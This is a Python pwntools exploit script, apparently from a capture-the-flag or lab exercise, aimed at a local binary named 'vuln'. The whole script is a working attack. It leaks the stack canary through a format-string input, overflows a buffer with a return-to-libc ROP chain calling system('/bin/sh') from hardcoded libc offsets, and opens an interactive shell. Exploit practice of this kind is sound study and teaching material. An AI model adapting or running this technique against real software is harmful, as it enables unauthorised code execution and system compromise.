from pwn import *

# Start the process
p = process('./vuln')

program = ELF('./vuln')
context.binary = program
rop = ROP(program) 

# Leak the canary
p.recvuntil(b"echo> ")
p.sendline(b"%39$llx")  # Format string to leak stack canary
canary = int(p.recvline().strip(), 16)
log.info(f"Leaked canary: {hex(canary)}")
print(f"Leaked canary: {hex(canary)}")

# Find system() and "/bin/sh" in libc
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

libc.address = 0x00007ffff7dc4000 # Libc base address on my system without ASLR.
poprdi = libc.address + 0x0000000000028215 # using ROPgadget - need RDI as it is first register needed in 64bit.
ret = libc.address + 0x000000000002668c # using ROPgadget
system = libc.address + 0x000000000004dab0 # using 'readelf'
binsh = libc.address + 0x0000000000197e34 # using 'strings'

# Generate the ROP Chain
# Changed from 72, to 64, to 56 to account for canary + 8
rop.raw(b"A"*56)  # trigger the buffer overflow !!Adjusted from 72 to 64 for canary
rop.raw(canary)    # Add canary to exploit
rop.raw(b"B"*8)    # Fill in missing bits for buffer
rop.raw(poprdi) # pop rdi
rop.raw(binsh)
rop.raw(ret)  # ret from libc
rop.raw(system)

rop_chain = rop.chain()

# Send the ROP chain and get a shell
p.recvuntil(b"read> ")
p.sendline(rop_chain) # Send the exploit to ./vuln

# Write the ROP chain to a file - to use with debugger
with open('rop_chain.txt', 'wb') as f:
    f.write(rop_chain)

p.interactive()  # Get an interactive shell
